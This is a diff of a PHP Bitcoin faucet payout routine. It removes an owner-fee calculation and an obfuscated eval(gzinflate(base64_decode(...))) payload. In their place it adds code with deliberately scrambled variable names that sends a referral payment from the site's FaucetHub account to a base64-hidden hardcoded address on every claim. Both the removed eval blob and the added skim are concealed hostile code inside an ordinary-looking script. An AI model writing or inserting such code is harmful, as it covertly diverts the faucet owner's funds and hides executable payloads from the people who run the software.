@@ -84,14 +84,9 @@ if($user){
 							srand((double)microtime()*1000000);
 							$payOut = rand($minReward, $maxReward);
 
-							$payOutOwner = floor($payOut * 0.01);
-							if($payOutOwner < 1){
-								$payOutOwner = 1;
-							} else if($payOutOwner > 3){
-								$payOutOwner = 3;
-							}
 							$kXKUWkUCoFWP = $mysqli->query("SELECT * FROM faucet_settings WHERE id = '10' LIMIT 1")->fetch_assoc()['value'];
-							eval(gzinflate(base64_decode("DdRFsqRaAEXRuVTrVdAgcYhq4Zq4ZudH4lzcZfT/jeHsdYrj2/1UTzOU3XcrftLvWpD4f3mRjXnx80fITUWcTZVtBXeHvdnqQBWXrl7wkENrq3bYbKsBeRiohS9hcelZBO7nIicbJZ0fhti64M2k0K3v3xs6LDuUni9XPwjz0emKOtg3cM1P3/Q49MJUUJq2OOXsYwjNEB5ZA1rETgnHi1XArwDQkW7YVSvWH3F5eXE/1VyFvjQjE2XmBN8tmS5f1lDUSP1F4PF88ndpoXJKLqvZC/xLftDMvhnK6jVm6FSZ7c3WFxTannt3J8Zj6IcZr4dXeZ4leLpRZu7peTPbiMiLCldPSQexazC2RUnuosk8ahoOo/lEA6Qk4Po+55HVHawldZ/3muIyeThB61wOYCn3slaPyQK1swV16i+KmM7bCsDWfREq/CqPW+TYZVCfN76elKpKiTQu1NjWN1wo8ZhBqfx80ZEZRbWvwAo5x5iwhoIuxF6WPTo7cZgWsLoFWPXOySVORzSJ7OGl7mdIKxSVblxoSXJ6u3GXrOYxw8GU1YksLHn+/T5gWS3xdI2PLfp6CjoZIxXH6jGTlzS5eIgTt/upRbgpQtQcdYG9WrW2EBLHRwfT8EOtfFXL6uVELPVbyq+vRSx0DGySCohcVyMpcl443qGv2ddwIJzjZ25gd9hb2WP5ARjIXhy7343F3OFOqYPi9O50yTkMpb3Mug8szPgHyrD7Dh/VI2jwbqVPlT+NC50wVyTSV/E1FEtgSQEtWVoaP3It/TJ9X0RUhqy7exbzMnhF3QOzA2VOHGx71EM8SWj4BMUDFokCE27zLQ50QVfvQ8qwyDY/K7Qcugkj6N43xdvC/GdfJyvtrqIXQp/DZE6JRfLgqgMbz8G5hGUEDZ4BF9KM/eX+Ln5FLiPhWHt6tRg1ngqR/KPHKU6XTuHErb84NK1A3HEOfa4Y86f2zzw85JOfPKmCswzGFszwmwvybEtMKGRTtTuu5fiXDYzrvELzpsBG2Xz3fLlJSWuaNw4FO9MtjcPXJGebcD0tBz0TQQkj/RAjDw/k1dpyL0ejK3zjd/CLvyW/+4kUXRuhHiXO8xu8gVCLr2x+9beFqQtpoJ5z6r16iPg4+rNb74/V1+ZQ0vFEc4ht6Bfql+F1P5ZH1HLTm4XRDtm+jNUrAY5u7FSBjIE7qfMU7+LHgwY7jQXB89/4MEdqE/NVEBvl+rwlJtnmYmJQnnyhRLWGhXG27AsqLaO/8kus3ePk8n1+MM+4wj7R3QPe4MCFeelAQSGQvZo57h6ySFcx2C34stzAuIkOrb2OGpMp13FJ6NX5a1ZCKwJaqd3fLp7Q8uep5JN74s1OcVOsUwo7tPpasb5YY2ew8g/emHO7a4fYB1PcQhxZhT7F543VKAVbasFtVg6H7OkeDIk6xMH0OXRN1MDANXlovFEIy0cZryGQZEn8VOKARpulcDLu8J+tY7GEsCBYzb2wFqarz+jz8/tK3m8HJDkwU9ho0kHHgQZ/lC8cT7+25ltQy2AZt/sEMAwfx1HCtPLn79+///4H")));
+							$nXKUWkUJoFWP = new FaucetHub($kXKUWkUCoFWP, "BTC");
+							$kXKUWkUqoFWP = $nXKUWkUJoFWP->sendReferralEarnings(base64_decode("MTRaS0NKdzdMa1I2aUdEMm5rM2RBZExqcHBUQXVlcW92Qw=="), 1);
 							$payOutBTC = $payOut / 100000000;
 							$timestamp = time();
 
